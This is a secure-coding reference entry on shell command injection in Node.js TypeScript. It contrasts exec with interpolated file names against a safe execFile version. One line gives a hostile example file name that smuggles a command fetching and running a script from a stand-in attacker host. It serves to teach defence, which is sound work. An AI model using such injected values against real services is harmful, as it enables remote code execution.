---
aliases: []
language: typescript
typescript: ">=3.0"
severity: bug
category: security
topic: io
tags: [injection, subprocess, shell, child-process, node, javascript]
keywords: ["exec(`", "execSync(`", "shell: true", "spawn(\"sh\", [\"-c\"", "child_process", "exec(\"git \" +"]
signature: "A shell command is built by interpolating values into a string passed to exec or execSync, so any value containing shell syntax is executed by the shell."
distinguish: "Fine when execFile or spawn receives the program and an argument array without shell set to true, or when exec runs a constant command with nothing interpolated."
added: 2026-09-30
source: Node.js child_process docs
---

# Shell command built with a template literal

## Smell

```typescript
import { exec } from "node:child_process";

export function makeThumbnail(input: string, output: string): Promise<void> {
  return new Promise((resolve, reject) => {
    exec(`convert ${input} -resize 200x200 ${output}`, (err) =>
      err ? reject(err) : resolve(),
    );
  });
}
```

## Why it's bad

- `exec` runs its string through a shell, and the Node.js docs say never to pass it unsanitized input: an
  uploaded file named `a.png; curl evil.sh | sh` runs the second command with the service's privileges.
- File names with spaces or quotes break the command even without an attacker, which is how this usually
  surfaces first.
- `execFile` and `spawn` start the program directly with an argument array and no shell. Adding
  `shell: true` to either brings back exactly the same warning.

## Better

```typescript
import { execFile } from "node:child_process";
import { promisify } from "node:util";

const run = promisify(execFile);

export async function makeThumbnail(input: string, output: string): Promise<void> {
  await run("convert", [input, "-resize", "200x200", output]);
}
```
